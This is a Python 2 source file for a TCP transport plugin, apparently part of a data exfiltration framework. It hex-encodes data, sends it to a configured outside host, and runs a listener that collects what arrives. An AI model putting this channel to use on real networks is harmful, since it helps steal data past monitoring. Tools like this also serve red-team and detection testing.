import socket
import sys

config = None
app_exfiltrate = None


def send(data):
    target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((target, port))
    client_socket.send(data.encode('hex'))
    client_socket.close()


def listen():
    port = config['port']
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server_address = ('', port)
        sock.bind(server_address)
        app_exfiltrate.log_message(
            'info', "[tcp] Starting server on port {}...".format(port))
        sock.listen(1)
    except:
        app_exfiltrate.log_message(
            'warning', "[tcp] Couldn't bind on port {}...".format(port))
        sys.exit(-1)

    while True:
        app_exfiltrate.log_message('info', "[tcp] Waiting for connections...")
        connection, client_address = sock.accept()
        try:
            app_exfiltrate.log_message(
                'info', "[tcp] client connected: {}".format(client_address))
            while True:
                data = connection.recv(65535)
                if data:
                    app_exfiltrate.log_message(
                        'info', "[tcp] Received {} bytes".format(len(data)))
                    try:
                        data = data.decode('hex')
                        app_exfiltrate.retrieve_data(data)
                    except Exception, e:
                        app_exfiltrate.log_message(
                            'warning', "[tcp] Failed decoding message {}".format(e))
                else:
                    break
        finally:
            connection.close()


class Plugin:

    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_plugin('tcp', {'send': send, 'listen': listen})